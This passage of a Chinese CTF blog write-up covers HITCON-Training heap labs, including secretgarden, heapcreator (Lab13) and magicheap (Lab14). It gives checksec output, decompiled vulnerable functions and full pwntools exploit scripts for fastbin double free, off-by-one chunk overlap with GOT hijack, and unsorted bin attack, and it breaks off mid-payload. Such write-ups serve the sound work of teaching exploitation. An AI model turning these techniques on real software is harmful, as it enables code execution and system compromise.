class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./secretgarden\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./secretgarden\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size, name, color)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"name :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"flower :\"</span>)</span><br><span class=\"line\">\tp.send(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"flower :\"</span>)</span><br><span class=\"line\">\tp.sendline(color)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">visit</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">del_</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"garden:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">clean</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">\"a\"</span>,<span class=\"string\">\"aaaa\"</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">\"b\"</span>,<span class=\"string\">\"bbbb\"</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">del_(<span class=\"number\">0</span>)</span><br><span class=\"line\">clean()</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">\"c\"</span>,<span class=\"string\">\"cccc\"</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\"></span><br><span class=\"line\">visit()</span><br><span class=\"line\">libc_addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">offset = <span class=\"number\">0x3c4b63</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc.address = libc_addr - offset</span><br><span class=\"line\"></span><br><span class=\"line\">malloc_hook = libc.symbols[<span class=\"string\">'__malloc_hook'</span>]</span><br><span class=\"line\">addr = <span class=\"number\">0x3c4aed</span> + libc.address</span><br><span class=\"line\">one_gadget = <span class=\"number\">0xf02a4</span> + libc.address</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">\"a\"</span>, <span class=\"string\">\"aaaa\"</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">\"b\"</span>, <span class=\"string\">\"bbbb\"</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\"></span><br><span class=\"line\">del_(<span class=\"number\">2</span>)</span><br><span class=\"line\">del_(<span class=\"number\">3</span>)</span><br><span class=\"line\">del_(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, p64(addr), <span class=\"string\">\"fake\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">\"c\"</span>, <span class=\"string\">\"cccc\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"string\">\"d\"</span>, <span class=\"string\">\"dddd\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>, <span class=\"number\">0x13</span> * <span class=\"string\">\"e\"</span> + p64(one_gadget),<span class=\"string\">\"asdf\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(addr)</span><br><span class=\"line\"></span><br><span class=\"line\">del_(<span class=\"number\">2</span>)</span><br><span class=\"line\">del_(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab13——heapcreator\"><a href=\"#Lab13——heapcreator\" class=\"headerlink\" title=\"Lab13——heapcreator\"></a>Lab13——heapcreator</h2><h3 id=\"防护-3\"><a href=\"#防护-3\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab13$ checksec heapcreator</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab13/heapcreator&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-3\"><a href=\"#分析-3\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>该题也是标准的堆题，功能有增删改查。</p>\n<h4 id=\"create\"><a href=\"#create\" class=\"headerlink\" title=\"create\"></a>create</h4><p>首先malloc(0x10)的chunk，存储在全局指针数组heaparray上。chunk中记录指向内容的指针和输入的size，</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">chunk</span>&#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> size; <span class=\"comment\">// 0x0</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *content; <span class=\"comment\">// 0x8</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h4 id=\"edit\"><a href=\"#edit\" class=\"headerlink\" title=\"edit\"></a>edit</h4><p>该功能内存在漏洞，在写入的时候会多写入一位，所以存在off_by_one write漏洞。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">edit_heap</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v3; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Index :\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">4u</span>LL);</span><br><span class=\"line\">  v1 = atoi(&amp;buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span class=\"number\">0</span> || v1 &gt; <span class=\"number\">9</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Out of bound!\"</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( heaparray[v1] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Content of heap : \"</span>, &amp;buf);</span><br><span class=\"line\">    read_input(*((<span class=\"keyword\">void</span> **)heaparray[v1] + <span class=\"number\">1</span>), *(_QWORD *)heaparray[v1] + <span class=\"number\">1L</span>L);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Done !\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"No such heap !\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"show\"><a href=\"#show\" class=\"headerlink\" title=\"show\"></a>show</h4><p>输出size和content的内容。</p>\n<h4 id=\"delete\"><a href=\"#delete\" class=\"headerlink\" title=\"delete\"></a>delete</h4><p>依次free掉content和chunk两个堆块，然后将heaparray全局数组上对应项置为NULL，所以不存在UAF漏洞。</p>\n<h3 id=\"利用-3\"><a href=\"#利用-3\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>​    我们要利用off-by-one写漏洞，实现前向的overlapping，具体方法是，首先申请两个size分别为0x18和0x10的chunk，使得size为0x18的chunk复用下一个chunk的prev_size字段；然后用edit功能修改下个chunk的size字段为\\x41（或\\x40）都可以，此时调用delete功能，就会向fastbin数组中0x20和0x40的单向链表中分别放入一个chunk，其中0x40的chunk与0x20的chunk形成了重叠，之后的利用就顺理成章了，我们看一下exp。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./heapcreator\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./heapcreator\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">create</span><span class=\"params\">(size, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Heap :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"heap:\"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"heap : \"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x18</span>, <span class=\"string\">\"a\"</span>) <span class=\"comment\"># 0 </span></span><br><span class=\"line\">create(<span class=\"number\">0x10</span>, <span class=\"string\">\"b\"</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># change size</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>, <span class=\"string\">\"a\"</span> * <span class=\"number\">0x18</span> + <span class=\"string\">\"\\x41\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">atoi_got = elf.got[<span class=\"string\">'atoi'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># push to fastbin</span></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0</span>) + <span class=\"string\">\"\\x21\"</span>.ljust(<span class=\"number\">8</span>,<span class=\"string\">\"\\x00\"</span>) + p64(<span class=\"number\">0x30</span>) + p64(atoi_got)</span><br><span class=\"line\"><span class=\"comment\"># use overlapping </span></span><br><span class=\"line\">create(<span class=\"number\">0x30</span>, payload) <span class=\"comment\"># 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak</span></span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">libc_base = addr - libc.symbols[<span class=\"string\">'atoi'</span>]</span><br><span class=\"line\">one_gadget = <span class=\"number\">0xf1147</span> + libc_base</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># hijack got</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>, p64(one_gadget))</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">\"pwnit\"</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab14——magicheap\"><a href=\"#Lab14——magicheap\" class=\"headerlink\" title=\"Lab14——magicheap\"></a>Lab14——magicheap</h2><h3 id=\"防护-4\"><a href=\"#防护-4\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab14$ checksec magicheap</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab14/magicheap&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-4\"><a href=\"#分析-4\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>还是增删改查。</p>\n<p>当输入4869时，若全局变量magic &gt; 0x1305，则直接cat flag。</p>\n<p>漏洞存在于edit功能中，存在一个任意长度的堆溢出。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">edit_heap</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">size_t</span> v0; <span class=\"comment\">// ST08_8</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// [rsp+4h] [rbp-1Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v4; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Index :\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">4u</span>LL);</span><br><span class=\"line\">  v2 = atoi(&amp;buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v2 &lt; <span class=\"number\">0</span> || v2 &gt; <span class=\"number\">9</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Out of bound!\"</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( heaparray[v2] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Size of Heap : \"</span>, &amp;buf);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">8u</span>LL);</span><br><span class=\"line\">    v0 = atoi(&amp;buf);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Content of heap : \"</span>, &amp;buf);</span><br><span class=\"line\">    read_input(heaparray[v2], v0);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Done !\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"No such heap !\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v4;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们需要利用这个堆溢出漏洞，完成bss段修改的需求。最容易想到的方法应该是直接构造unlink利用。</p>\n<p>该题由于提示用unsorted bin attack，unsorted bin attack的利用效果是将任意地址的数修改为一个很大的数，看起来似乎没有什么用，但也至少有如下两个利用场景：</p>\n<ul>\n<li>我们通过修改循环的次数来使得程序可以执行多次循环。</li>\n<li>我们可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。</li>\n</ul>\n<p>具体的原理可以去CTF Wiki上看（<a href=\"https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack/\" target=\"_blank\" rel=\"noopener\">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack/</a>）</p>\n<p>我们使用堆溢出，修改相邻的位于unsorted bin中的chunk的bk字段，指向我们想要修改的地址 - 0x10。由于unsorted bin是FIFO，我们只需要malloc一次，就能将目标地址的数修改为main_arena+offset的地址，即一个远远大于0x1305的数，也就实现了利用。</p>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./magicheap\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./magicheap\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">create</span><span class=\"params\">(size, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Heap : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"heap:\"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index, size, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Heap : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"heap : \"</span>)</span><br><span class=\"line\">\tp.sendline(content)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x10</span>, <span class=\"string\">\"a\"</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x80</span>, <span class=\"string\">\"b\"</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x10</span>, <span class=\"string\">\"c\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">addr = <span class=\"number\">0x6020c0</span> - <span class=\"number\">0x10</span></span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">0x10</span> + p64(<span 